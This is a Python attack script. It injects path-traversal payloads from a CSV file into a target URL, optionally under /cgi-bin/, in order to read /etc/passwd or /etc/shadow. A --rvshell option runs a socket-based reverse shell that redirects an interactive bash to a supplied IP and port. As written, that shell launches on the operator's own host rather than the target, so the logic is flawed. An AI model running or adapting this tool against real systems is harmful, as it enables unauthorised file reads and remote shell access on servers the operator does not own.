import argparse
import requests
import csv
import socket
import subprocess
import os

def normalize_url(endpoint):
    if not endpoint.startswith(('http://', 'https://')):
        # Try HTTPS first, fallback to HTTP if HTTPS fails
        for scheme in ['https://', 'http://']:
            test_url = scheme + endpoint
            try:
                response = requests.head(test_url, timeout=3)
                response.raise_for_status()
                return test_url
            except requests.exceptions.RequestException:
                continue
        raise ValueError("Could not reach the endpoint with either HTTPS or HTTP.")
    return endpoint

def fetch_html(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        print(f"Successfully fetched HTML from {url}")
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while fetching HTML from {url}: {e}")

def load_payloads(payload_file):
    try:
        with open(payload_file, 'r') as file:
            payloads = [line.strip() for line in file.readlines()]
        return payloads
    except FileNotFoundError:
        print(f"Payload file '{payload_file}' not found.")
        return []

def start_reverse_shell(target_ip, target_port):
    """ Start a reverse shell connection to the target IP and port """
    try:
        # Establish connection to target IP and port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        # Redirect stdin, stdout, and stderr to the socket
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        subprocess.call(['/bin/bash', '-i'])
    except Exception as e:
        print(f"Error starting reverse shell: {e}")

def main():
    parser = argparse.ArgumentParser(description="Fetch and display HTML from a given endpoint with injected payloads.")
    parser.add_argument("-e", "--endpoint", required=True, help="Target URL or IP (with or without http/https)")
    parser.add_argument("-p", "--payload", default="payloads.csv", help="CSV file with payloads (default: payloads.csv)")
    parser.add_argument("--cgi-bin", "--cb", action="store_true", help="Prepend '/cgi-bin/' before the payload in the final URL")
    parser.add_argument("path", nargs="?", choices=["/etc/passwd", "/etc/shadow", "/bin/bash"], help="Specify either '/etc/passwd', '/etc/shadow', or '/bin/bash' to append to the URL")
    parser.add_argument("--rvshell", action="store_true", help="Start a reverse shell if '/bin/bash' is found in the payload")
    parser.add_argument("--ip", type=str, help="IP address to receive the reverse shell (required with --rvshell)")
    parser.add_argument("--port", type=int, help="Port number to listen for the reverse shell (required with --rvshell)")

    args = parser.parse_args()

    # Validate --rvshell args
    if args.rvshell and (not args.ip or not args.port):
        print("Error: --rvshell requires both --ip and --port to be specified.")
        return

    # Normalize the URL to handle http/https
    try:
        full_url = normalize_url(args.endpoint)
    except ValueError as ve:
        print(f"URL Error: {ve}")
        return

    # Load payloads from the specified CSV
    payloads = load_payloads(args.payload)
    if not payloads:
        return  # Exit if no payloads are loaded

    # If --cgi-bin flag is set, prepend /cgi-bin/
    cgi_bin_prefix = "/cgi-bin/" if args.cgi_bin else ""

    # Path argument will determine if /etc/passwd, /etc/shadow, or /bin/bash is appended
    path_suffix = args.path if args.path else ""

    # Process each payload
    for payload in payloads:
        # Construct the final URL with optional cgi-bin prefix and path suffix
        url_with_payload = f"{full_url}{cgi_bin_prefix}{payload}{path_suffix}"
        fetch_html(url_with_payload)

        # If --rvshell is set, look for /bin/bash in the payload URL and trigger reverse shell
        if args.rvshell and "/bin/bash" in payload:
            print(f"Payload {payload} contains '/bin/bash', attempting to initiate reverse shell.")
            start_reverse_shell(args.ip, args.port)
            break  # Exit after reverse shell is initiated

if __name__ == "__main__":
    main()
